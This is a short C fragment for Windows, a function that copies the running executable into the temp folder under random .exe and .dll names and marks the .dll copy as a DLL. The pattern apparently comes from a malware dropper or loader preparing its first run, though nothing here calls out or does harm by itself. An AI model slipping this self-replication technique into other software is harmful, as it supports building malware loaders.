VOID PrepareFirstRun(LPCSTR lpExePath)
{
	CHAR chFolderPath[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(chFolderPath)-1, chFolderPath);

	GetTempFileName(chFolderPath, NULL, 0, g_chExePath);
	PathRemoveExtension(g_chExePath);
	PathAddExtension(g_chExePath, ".exe");
	CopyFileA(lpExePath, g_chExePath, FALSE);

	GetTempFileName(chFolderPath, NULL, 0, g_chDllPath);
	PathRemoveExtension(g_chDllPath);
	PathAddExtension(g_chDllPath, ".dll");
	CopyFileA(lpExePath, g_chDllPath, FALSE);
	SetFileDllFlag(g_chDllPath);
}